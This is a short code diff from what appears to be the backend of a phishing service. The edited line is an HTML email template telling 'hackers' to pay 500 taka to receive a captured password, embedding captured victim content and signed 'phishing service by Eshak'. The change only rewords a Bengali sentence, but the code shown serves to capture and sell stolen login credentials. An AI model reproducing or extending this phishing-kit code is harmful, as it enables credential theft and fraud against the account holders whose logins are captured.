@@ -57,7 +57,7 @@ const decrypted = encryptpwd.decrypt(encrypted, password);
     
     
    // console.log("es"+toMail);
-    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p> পাসওয়ার্ড পেতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-৫০০ দিতে হবে। </p><br><br> If the input value has correct then the id was hacked!"+captured_content+ "<br><br><br><br><br><br> Thanks for understanding,<br>phishing service by Eshak";
+    var template = "<h1> Dear Hackers,</h1> <p style='color:red;'>To get password and making the app more secure, you have to pay onetime tk-500, for the stay live server running,<p> <p>পাসওয়ার্ড পেতে এবং অ্যাপটিকে আরও সুরক্ষিত করতে, লাইভ সার্ভার চালু থাকার জন্য আপনাকে এককালীন টাকা-500 টাকা দিতে হবে। </p><br><br> If the input value has correct then the id was hacked!"+captured_content+ "<br><br><br><br><br><br> Thanks for understanding,<br>phishing service by Eshak";
 
     
   if(req.body.owner){
